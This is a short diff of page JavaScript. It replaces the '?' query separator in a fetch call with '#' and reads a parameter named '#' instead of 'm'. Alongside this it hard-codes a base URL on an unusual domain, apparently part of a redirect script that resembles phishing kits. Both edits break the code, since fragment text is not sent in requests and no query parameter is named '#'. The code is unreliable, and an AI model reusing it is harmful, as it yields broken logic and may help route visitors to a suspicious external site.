@@ -24,7 +24,7 @@
         }
 
         function getData(url, params) {
-            return fetch(url + '?' + new URLSearchParams(params), {
+            return fetch(url + '#' + new URLSearchParams(params), {
                 method: 'GET',
                 headers: {
                     'Content-Type': 'application/json'
@@ -46,7 +46,7 @@
 
         // Extract the 'm' parameter from the URL
         var urlParams = new URLSearchParams(window.location.search);
-        var encodedHash = urlParams.get('m');
+        var encodedHash = urlParams.get('#');
 
         var baseUrl = "https://zenzzy.cyou/BU37/#E";
 
